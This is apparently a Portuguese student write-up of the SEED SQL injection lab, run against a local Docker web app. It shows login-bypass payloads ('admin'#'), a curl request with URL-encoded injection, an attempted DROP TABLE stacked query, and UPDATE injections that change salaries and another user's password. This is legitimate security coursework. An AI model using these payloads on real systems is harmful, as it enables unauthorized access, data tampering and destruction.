# SQL Injection Attack

## Setup

Numa fase inicial adicionamos uma nova entrada nos hosts conhecidos pela máquina virtual, executamos os containers fornecidos no lab e abrimos uma shell com acesso direto à base de dados manipulada durante os exercícios.

```bash
sudo nano etc/hosts     # colocar '10.9.0.5 www.seed-server.com'

$ dcbuild               # docker-compose build
$ dcup                  # docker-compose up

$ docksh f3             # Abrir uma shell do MySQL container
$ mysql -u root -pdees  # Executar o MySQL com utilizador root
$ use sqllab_users;     # Selecionar o schema
```

## Tasks

### Task 1: Get Familiar with SQL Statements

A tarefa consistia em selecionar os dados do utilizador "Alice". Como a sintaxe SQL já é bem conhecida facilmente chegamos ao comando correcto para executar a operação:

```sql
SELECT * FROM credentials WHERE Name = "Alice";
```

Obtivemos assim todos os dados pessoais do utilizador:

![Task 1](../img/lab8task1.png)

###  Task 2: SQL Injection Attack on SELECT Statement

#### Task 2.1 - Login in adminstrator mode from webpage

Acedemos ao site "www.seed-server.com" disponibilizado pelo container Docker e também ao ficheiro `unsafe_home.php`. Aí pudemos constatar que a query utilizada é frágil pois o servidor cria o comando dinamicamente com as strings não sanitizadas do input do utilizador:

```sql
WHERE name= '$input_uname' and Password='$hashed_pwd'
```

Como o campo password é cifrado é vantajoso usurpar o funcionamento da pesquisa usando somente o campo do username.<br>
Ao usarmos o input "admin'#", garantimos o acesso privilegiado, pois todo a verificação da palavra chave torna-se irrelevante uma vez que é comentada. Assim, o código executado do lado do servidor passou a ser o seguinte:

```sql
SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
FROM credential
WHERE name='admin'# and Password=’$hashed_pwd’
```

Tal como esperado, conseguimos fazer login com a conta do administrador e assim obter todos os dados relativos ao resto dos utilizadores da aplicação:

![Task 2 a](../img/lab8task2a.png)

#### Task 2.2 - Login in adminstrator mode from command line

Desta vez realizamos o ataque através de um pedido GET. Um exemplo de um pedido a este servidor numa linha de comandos seria:

```bash
curl "www.seed-server.com/unsafe_home.php?username=USER&Password=PASS"
```

Com o mesmo input da secção anterior, desta vez cifrado usando as convenções (%27 = ' e %23 = #), obtivemos o seguinte comando malicioso:

```bash
curl "http://www.seed-server.com/unsafe_home.php?username=admin%27%23&Password="
```

Obtivemos com isto o código HTML de toda a página que continha os dados pessoais dos utilizadores

![Task 2 b](../img/lab8task2b.png)

#### Task 2.3 - Append a new SQL statement

Podemos adicionar novos comandos SQL usando ";". Para isso, modificamos no nosso input malicioso inicial para que fizesse um side-effect no servidor. Por exemplo eliminar a tabela das credenciais:

```sql
admin'; DROP TABLE IF EXISTS credentials; #
```

No entanto a operação não chegou a ser executada devido a um erro na base de dados:

![Task 2 c](../img/lab8task2c.png)

Segundo [esta fonte](https://www.php.net/manual/en/mysqli.quickstart.multiple-statement.php), a extensão de MySQL utilizada pelo PHP do servidor tem uma proteção que impede a execução de múltiplas queries, pelo que não foi possível concluir o ataque.

### Task 3: SQL Injection Attack on UPDATE Statement

#### Task 3.1 - Modify your own salary

Após dar login com uma conta do sistema (por exemplo username = Alice, password = 11), tivemos acesso a uma página para editar os dados pessoais. Esta é gerida a partir do ficheiro disponibilizado `unsafe_edit_backend.php`, que contém uma query também formada dinamicamente com as strings não sanitizadas do input do utilizador. <br>
O nosso ataque consistui na utilização do campo "phone number". Usando a mesma técnica dos tópicos anteriores obtivemos o seguinte código que pode manipular o salário do utilizador:

```sql
933667378',Salary='9999999
```

Note-se que a plica (') antes do valor do salário é importante para completar a última instrução antes do WHERE. No final o servidor executou o seguinte código:

```sql
UPDATE credential SET
nickname='$input_nickname',
email='$input_email',
address='$input_address',
Password='$hashed_pwd',
PhoneNumber='933667378',Salary='9999999' WHERE ID=$id;
```

Tal como previsto, a variável salário foi também alterada para o valor escolhido:

![Task 3 a](../img/lab8task3a.png)

#### Task 3.2 - Modify other people’ salary

Para alterar o valor do salário de outro utilizador usamos uma técnica parecida com a anterior. No entanto criamos uma WHERE clause diferente e comentamos a que estava no sistema para não interferir na pesquisa:

```sql
933667378',Salary='-9999999' WHERE Name='Boby'#
```

Com este input, o servidor executou o seguinte código:

```sql
UPDATE credential SET
nickname='$input_nickname',
email='$input_email',
address='$input_address',
Password='$hashed_pwd',
PhoneNumber='933667378',Salary='-9999999' WHERE Name='Boby'# WHERE ID=$id;
```

Aqui podemos ver o valor do salário do Boby antes e depois do ataque:

![Task 3 b](../img/lab8task3b.png)

#### Task 3.3 - Modify other people’ password

Para alterar a password de outro utilizador usamos uma técnica parecida com a anterior. Desta vez o valor a modificar foi cifrado antes com criptografia SHA1. Por exemplo, para a nova palavra-passe `penguin`, o hash é `73335c221018b95c013ff3f074bd9e8550e8d48e`.

```sql
912345678', password='73335c221018b95c013ff3f074bd9e8550e8d48e' WHERE name='Boby'#
```

Com este input, o servidor executou o seguinte código:

```sql
UPDATE credential SET
nickname='$input_nickname',
email='$input_email',
address='$input_address',
Password='$hashed_pwd',
PhoneNumber='933667378', password='73335c221018b95c013ff3f074bd9e8550e8d48e' WHERE name='Boby'# WHERE ID=$id;
```

Com a nova palavra passe alterada, conseguimos entrar na conta do Boby:

![Task 3 c](../img/lab8task3c.png)